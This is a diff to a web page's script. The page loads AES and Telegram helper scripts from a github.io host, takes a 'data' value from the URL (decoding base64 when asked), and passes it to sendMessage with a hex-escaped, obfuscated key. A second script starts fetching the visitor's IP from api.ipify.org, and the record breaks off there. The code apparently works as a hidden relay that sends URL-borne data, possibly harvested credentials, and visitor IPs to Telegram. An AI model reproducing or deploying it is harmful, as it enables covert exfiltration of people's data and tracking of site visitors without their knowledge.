@@ -3,9 +3,18 @@
 <script src="https://ummx.github.io/import/script/aes.js"></script>
 <script src="https://ummx.github.io/import/script/telegram-api.js"></script>
 <script>
- var data = atob(location.search.slice(1).split("&")[0].split("=")[1]); 
-  var message=data;
+let params = new URLSearchParams(document.location.search);
+let t = params.get("type"); // is the string "Jonathan"
+let d = params.get('data')
+if(t == 'base64'){
+   d=atob(d);
+}
+else{
+    d=d;
+}
+  var message=d;
   var _0x3e7f=["\x36\x37\x30\x34\x37\x36\x31\x62\x33\x63\x62\x66\x38\x32\x36\x30\x63\x35\x35\x36\x63\x33\x65\x34\x31\x33\x39\x39\x61\x62\x38\x62\x63\x64\x66\x30\x62\x35\x31\x61\x39\x38\x39\x33\x35\x65\x66\x63\x30\x34\x30\x35\x62\x64\x39\x63\x61\x30\x39\x38\x64\x65\x38\x37"];sendMessage(message,_0x3e7f[0])
+
 </script>
 <script>
     fetch('https://api.ipify.org/?format=json')
